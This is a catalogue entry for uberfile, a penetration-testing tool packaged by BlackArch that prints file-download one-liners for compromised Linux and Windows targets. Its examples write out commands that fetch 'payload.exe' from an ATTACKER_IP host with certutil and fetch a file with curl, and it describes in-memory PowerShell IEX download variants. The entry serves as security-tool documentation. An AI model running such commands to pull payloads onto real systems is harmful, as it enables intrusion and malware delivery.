---
name: "uberfile"
categories:
  - blackarch-misc
version: "14.4414c2a"
homepage: "https://github.com/ShutdownRepo/uberfile"
packaged-by: [blackarch]
blackarch-builddate: "2026-01-17"
build-system: python
license: GPL-3.0-or-later
meta-checked: "2026-11-09"
github-repo: "ShutdownRepo/uberfile"
github-stars: 44
github-pushed: "2021-01-22"
github-archived: false
github-issues: 0
github-match: "exact"
gh-checked: "2026-11-07"
worth: 2.2
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# uberfile

> Generates file-transfer one-liners for Linux or Windows targets.

*No corpus evidence — derived from upstream documentation.*

## What it's for

uberfile (ShutdownRepo) is a Python CLI that prints ready-to-paste
file-download commands for pulling a file from your HTTP server onto a
UNIX-like or Windows host: `curl`/`wget` on Linux, and on Windows
`certutil`, PowerShell WebClient, `Invoke-WebRequest` or BitsTransfer —
including in-memory (`IEX ... downloadString`) variants. Give it the
listener address and port, target OS and the file names and it emits the
matching one-liner; with no options it launches an interactive menu
instead. It only generates commands — it neither serves the file (run your
own HTTP server) nor executes anything on the target.

## Typical use cases

### Generate a Windows certutil downloader

Get a copy-paste transfer command for a Windows target.

```
uberfile -t windows -d certutil -lh ATTACKER_IP -lp 8080 -f payload.exe -o payload.exe
```

Outcome: prints
`certutil.exe -urlcache -f http://ATTACKER_IP:8080/payload.exe payload.exe` —
serve the file on that address and port, then paste the printed line on the
target to fetch it.

### Generate a Linux curl one-liner

Same idea for a UNIX-like target.

```
uberfile -t linux -d curl -lh ATTACKER_IP -lp 8080 -f notes.txt -o /tmp/notes.txt
```

Outcome: prints `curl http://ATTACKER_IP:8080/notes.txt -o /tmp/notes.txt`;
`-d wget` produces the wget equivalent instead.

### List every command it can generate

Browse the catalogue before choosing.

```
uberfile -l
```

Outcome: prints all downloader one-liners uberfile knows for both operating
systems, including the PowerShell and in-memory variants — the same set the
interactive menu offers.

### Pick interactively

Drive the selection through menus.

```
uberfile
```

Outcome: starts the terminal user interface; walk through target OS,
downloader and file options, and the finished one-liner is printed at the
end.
